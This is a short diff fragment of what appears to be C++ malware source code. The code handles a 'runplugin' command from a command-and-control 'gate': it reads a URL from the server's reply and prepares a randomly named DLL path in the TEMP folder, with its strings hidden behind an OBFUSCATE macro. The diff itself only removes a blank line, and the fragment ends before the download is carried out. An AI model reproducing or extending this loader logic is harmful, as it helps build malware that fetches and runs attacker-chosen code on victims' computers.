@@ -113,7 +113,6 @@ public:
 				}
 				else if (responseFromGate.find(OBFUSCATE("runplugin")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
-
 					std::string random_str = Helpers::RandomString(10);
 					std::string url(v[2]);
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".dll"));
